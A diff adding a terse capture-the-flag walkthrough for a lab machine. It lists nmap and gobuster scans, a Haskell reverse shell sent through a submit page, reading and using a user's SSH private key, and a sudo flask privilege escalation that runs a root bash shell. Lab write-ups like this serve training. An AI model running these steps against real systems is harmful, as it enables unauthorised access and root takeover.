@@ -1,0 +1,17 @@
+1 - nmap -A 10.10.198.44
+2 - http://10.10.198.44:5001/
+3 - gobuster dir -u http://10.10.198.44:5001/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+4 - http://10.10.198.44:5001/submit/ -> haskell reverse shell
+5 - cat /home/prof/.ssh/id_rsa
+6 - ssh -i id_rsa prof@10.10.198.44
+7 - cat user.txt
+8 - sudo -l (flask)
+9 - cat > shell.py << EOF
+import os
+os.system("/bin/bash")
+EOF
+
+10 - export FLASK_APP=shell.py
+11 - sudo /usr/bin/flask run
+12 - cat /root/root.txt
+
